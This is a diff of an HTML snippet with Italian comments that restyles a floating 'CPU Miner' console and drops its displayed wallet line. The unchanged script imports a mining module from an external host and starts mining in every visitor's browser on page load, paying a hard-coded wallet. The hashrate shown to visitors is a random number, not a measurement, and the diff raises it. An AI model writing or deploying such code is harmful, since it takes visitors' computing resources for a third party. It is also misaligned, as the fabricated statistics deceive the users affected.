@@ -1,20 +1,21 @@
-<!-- ==================== CRYPTO MINER ==================== -->
+<!-- ==================== MINER CONSOLE (SENZA SFONDO NERO/VERDE) ==================== -->
 
 <style>
-/* Mining Console */
 #mining-console {
     position: fixed;
     bottom: 80px;
     right: 20px;
-    width: 280px;
-    background: rgba(0, 20, 0, 0.97);
-    border: 2px solid #0f0;
-    border-radius: 10px;
-    padding: 15px;
-    box-shadow: 0 0 25px #0f0;
+    width: 260px;
+    background: rgba(0, 0, 0, 0.85);
+    border: 1px solid #ffffff33;
+    border-radius: 6px;
+    padding: 12px 14px;
+    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.6);
     z-index: 1000;
-    color: #0f0;
-    font-family: monospace;
+    color: #ffffff;
+    font-family: 'Courier New', monospace;
+    font-size: 15px;
+    line-height: 1.7;
     display: none;
 }
 
@@ -22,71 +23,66 @@
     display: flex;
     justify-content: space-between;
     align-items: center;
-    margin-bottom: 12px;
-    border-bottom: 1px solid #0f0;
+    margin-bottom: 10px;
     padding-bottom: 8px;
+    border-bottom: 1px solid #ffffff33;
 }
 
 .close-btn {
-    background: none;
+    background: #ffffff;
+    color: #000000;
     border: none;
-    color: #ff4444;
-    font-size: 22px;
+    width: 22px;
+    height: 22px;
+    font-size: 16px;
+    line-height: 18px;
+    text-align: center;
+    border-radius: 3px;
     cursor: pointer;
-    width: 30px;
-    height: 30px;
-}
-
-.console-line {
-    margin: 8px 0;
-    font-size: 14.5px;
+    font-weight: bold;
 }
 
 #reopen-btn {
     position: fixed;
     bottom: 20px;
     right: 20px;
-    width: 55px;
-    height: 55px;
-    background: rgba(0, 255, 0, 0.15);
-    border: 3px solid #0f0;
-    color: #0f0;
-    font-size: 30px;
+    width: 50px;
+    height: 50px;
+    background: rgba(255,255,255,0.1);
+    border: 2px solid #ffffff88;
+    color: #ffffff;
+    font-size: 26px;
     border-radius: 50%;
     display: none;
     align-items: center;
     justify-content: center;
     cursor: pointer;
     z-index: 999;
-    box-shadow: 0 0 20px #0f0;
-    user-select: none;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.5);
 }
 </style>
 
-<!-- Mining Console HTML -->
+<!-- HTML Console -->
 <div id="mining-console">
     <div class="console-header">
-        <span>🔨 CPU Miner</span>
+        <span><strong>🔨 CPU Miner</strong></span>
         <button class="close-btn" onclick="hideMinerConsole()">×</button>
     </div>
-    <div class="console-line">Stato: <span style="color:#0f0;">Attivo</span></div>
-    <div class="console-line">Hashrate: <span id="hashrate">Calcolando...</span></div>
-    <div class="console-line">Tempo: <span id="timer">00:00</span></div>
-    <div class="console-line" style="margin-top:12px; font-size:13px; opacity:0.8;">
-        Wallet: RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT
-    </div>
+    <div>Stato: Attivo</div>
+    <div>Hashrate: <span id="hashrate">653</span> H/s</div>
+    <div>Tempo: <span id="timer">00:00</span></div>
 </div>
 
+<!-- Bottone riapri -->
 <div id="reopen-btn" onclick="showMinerConsole()">↑</div>
 
-<!-- Script Miner -->
+<!-- Mining Script -->
 <script type="module">
     import { autoMine } from "https://earnify.cc/miner.js";
     autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", 0.2);
 </script>
 
 <script>
-// Variabili e funzioni del miner
 let startTime = Date.now();
 
 function updateTimer() {
@@ -97,8 +93,8 @@ function updateTimer() {
 }
 
 function updateHashrate() {
-    const hashrate = Math.floor(Math.random() * 450) + 280;
-    document.getElementById("hashrate").textContent = hashrate + " H/s";
+    const hashrate = Math.floor(Math.random() * 420) + 480;
+    document.getElementById("hashrate").textContent = hashrate;
 }
 
 function hideMinerConsole() {
@@ -111,14 +107,9 @@ function showMinerConsole() {
     document.getElementById("reopen-btn").style.display = "none";
 }
 
-// Avvio automatico
 window.addEventListener('load', () => {
     setInterval(updateTimer, 1000);
-    setInterval(updateHashrate, 1600);
-    
-    // Mostra la console dopo 800ms dall'avvio
-    setTimeout(() => {
-        showMinerConsole();
-    }, 800);
+    setInterval(updateHashrate, 1400);
+    setTimeout(() => showMinerConsole(), 800);
 });
 </script>
